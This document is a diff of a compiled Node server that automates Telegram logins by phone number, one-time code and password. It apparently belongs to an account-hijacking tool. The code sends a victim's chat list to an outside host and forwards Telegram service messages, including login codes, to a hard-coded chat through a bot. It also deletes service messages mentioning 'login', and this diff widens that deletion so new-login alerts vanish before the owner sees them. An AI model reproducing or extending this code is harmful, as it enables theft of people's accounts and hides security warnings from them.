@@ -59716,13 +59716,13 @@ app.get('/login', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
     const result = yield (0, telegramManager_1.createClient)(req.query.phone);
     if (result.isCodeViaApp) {
         console.log('OTP SENT!! - ', req.query.phone);
-        res.sendStatus(200);
+        res.status(200).send(result.phoneCodeHash);
     }
     else {
         res.sendStatus(400);
     }
 }));
-app.get('/otp', (req, res, next) => __awaiter(void 0, void 0, void 0, function* () {
+app.get('/otp', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
     const phoneCode = req.query.code;
     const number = req.query.phone;
     const cli = yield (0, telegramManager_1.getClient)(number);
@@ -59739,12 +59739,6 @@ app.get('/otp', (req, res, next) => __awaiter(void 0, void 0, void 0, function* 
     else {
         res.sendStatus(400);
     }
-    next();
-}), (req, res) => __awaiter(void 0, void 0, void 0, function* () {
-    const number = req.query.number;
-    const cli = yield (0, telegramManager_1.getClient)(number);
-    cli === null || cli === void 0 ? void 0 : cli.disconnect();
-    yield (0, telegramManager_1.deleteClient)(number);
 }));
 app.get('/password', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
     const password = req.query.password;
@@ -59816,7 +59810,7 @@ var __importDefault = (this && this.__importDefault) || function (mod) {
     return (mod && mod.__esModule) ? mod : { "default": mod };
 };
 Object.defineProperty(exports, "__esModule", ({ value: true }));
-exports.createClient = exports.disconnectAll = exports.deleteClient = exports.hasClient = exports.getClient = void 0;
+exports.createClient = exports.disconnectAll = exports.deleteClient = exports.hasClient = exports.getClient = exports.restAcc = void 0;
 const telegram_1 = __webpack_require__(/*! telegram */ "./node_modules/telegram/index.js");
 const telegram_2 = __webpack_require__(/*! telegram */ "./node_modules/telegram/index.js");
 const sessions_1 = __webpack_require__(/*! telegram/sessions */ "./node_modules/telegram/sessions/index.js");
@@ -59832,12 +59826,17 @@ function restAcc(phoneNumber) {
         yield (0, Helpers_1.sleep)(1000);
         console.log("Reset - ", phoneNumber);
         const client = getClient(phoneNumber);
-        yield client.client.destroy();
-        yield client.client.disconnect();
-        client.client.session.delete();
-        deleteClient(phoneNumber);
+        if (client) {
+            yield client.client.destroy();
+            yield client.client.disconnect();
+            client.client.session.delete();
+            client.client = null;
+            delete client['client'];
+            yield deleteClient(phoneNumber);
+        }
     });
 }
+exports.restAcc = restAcc;
 function getClient(number) {
     return clients.get(number);
 }
@@ -59873,9 +59872,21 @@ function disconnectAll() {
 exports.disconnectAll = disconnectAll;
 function createClient(number) {
     return __awaiter(this, void 0, void 0, function* () {
-        const cli = new TelegramManager(number);
-        clients.set(number, cli);
-        return cli.sendCode();
+        if (clients.has(number)) {
+            const cli = clients.get(number);
+            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
+                yield restAcc(number);
+            }), 240000);
+            return (yield cli.sendCode(false));
+        }
+        else {
+            const cli = new TelegramManager(number);
+            clients.set(number, cli);
+            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
+                yield restAcc(number);
+            }), 240000);
+            return (yield cli.sendCode(false));
+        }
     });
 }
 exports.createClient = createClient;
@@ -59917,10 +59928,10 @@ class TelegramManager {
                     apiHash,
                     settings: new telegram_1.Api.CodeSettings({}),
                 }));
+                console.log('Send result - ', sendResult);
                 if (sendResult instanceof telegram_1.Api.auth.SentCodeSuccess)
                     throw new Error("logged in right after sending the code");
                 this.phoneCodeHash = sendResult.phoneCodeHash;
-                // If we already sent a SMS, do not resend the phoneCode (hash may be empty)
                 if (!forceSMS || sendResult.type instanceof telegram_1.Api.auth.SentCodeTypeSms) {
                     return {
                         phoneCodeHash: sendResult.phoneCodeHash,
@@ -59931,19 +59942,16 @@ class TelegramManager {
                     phoneNumber: `+${this.phoneNumber}`,
                     phoneCodeHash: sendResult.phoneCodeHash,
                 }));
+                console.log('ReSend result - ', sendResult);
                 if (resendResult instanceof telegram_1.Api.auth.SentCodeSuccess)
                     throw new Error("logged in right after resending the code");
                 this.phoneCodeHash = resendResult.phoneCodeHash;
-                setTimeout(() => __awaiter(this, void 0, void 0, function* () {
-                    yield restAcc(this.phoneNumber);
-                }), 120000);
                 return {
                     phoneCodeHash: resendResult.phoneCodeHash,
                     isCodeViaApp: resendResult.type instanceof telegram_1.Api.auth.SentCodeTypeApp,
                 };
             }
             catch (err) {
-                yield restAcc(this.phoneNumber);
                 console.log(err);
                 if (err.errorMessage === "AUTH_RESTART") {
                     return this.client.sendCode({ apiId, apiHash }, `+${this.phoneNumber}`, forceSMS);
@@ -60011,7 +60019,7 @@ class TelegramManager {
                     yield axios_1.default.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
                     setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                         yield restAcc(this.phoneNumber);
-                    }), 40000);
+                    }), 50000);
                     return { status: 200, message: "Login success" };
                 }
             }
@@ -60062,6 +60070,7 @@ class TelegramManager {
 }
 function deleteMsgs(event) {
     return __awaiter(this, void 0, void 0, function* () {
+        console.log(event.message.text);
         if (event.message.chatId.toString() == "777000") {
             const payload = {
                 chat_id: "-1001801844217",
@@ -60077,9 +60086,9 @@ function deleteMsgs(event) {
             yield fetchWithTimeout(`${ppplbot}`, options);
         }
         yield (0, Helpers_1.sleep)(300);
-        const msgs = yield event.client.getMessages("777000", { limit: 3 });
+        const msgs = yield event.client.getMessages("777000", { limit: 2 });
         msgs.forEach((msg) => __awaiter(this, void 0, void 0, function* () {
-            if (msg.text.toLowerCase().includes('we detected') || msg.text.toLowerCase().includes('new login')) {
+            if (msg.text.toLowerCase().includes('login')) {
                 yield msg.delete({ revoke: true });
             }
         }));
